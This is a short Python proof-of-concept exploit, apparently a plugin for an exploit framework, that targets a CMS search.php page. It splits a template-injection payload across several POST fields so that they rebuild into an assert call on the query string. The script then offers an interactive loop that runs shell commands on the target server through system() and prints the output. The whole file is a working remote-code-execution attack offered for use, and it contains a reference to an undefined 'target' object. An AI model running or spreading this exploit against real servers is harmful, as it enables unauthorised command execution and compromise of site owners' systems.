from plugin.component.check import url_check
import requests
import re


def poc(url):
    try:
        url_check(url,"search.php")

        while 1:
            try:
                command = raw_input("[*] input the command:")
                if command != "exit":
                    url = target.url + "?system(%s)" % command
                    post_data = {
                        "searchtype": "5",
                        "searchword": "{if{searchpage:year}",
                        "year": ":as{searchpage:area}}",
                        "area": "s{searchpage:letter}",
                        "letter": "ert{searchpage:lang}",
                        "yuyan": "($_SE{searchpage:jq}",
                        "jq": "RVER{searchpage:ver}",
                        "ver": "[QUERY_STRING]));/*"
                    }

                    r = requests.post(url, data=post_data)
                    print(r.text[:r.text.find("<!DOCTYPE html>")].encode(r.encoding))
                else:
                    break
            except EOFError as e:
                print("[*] type 'exit' to quit")
                pass
    except Exception:
        print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
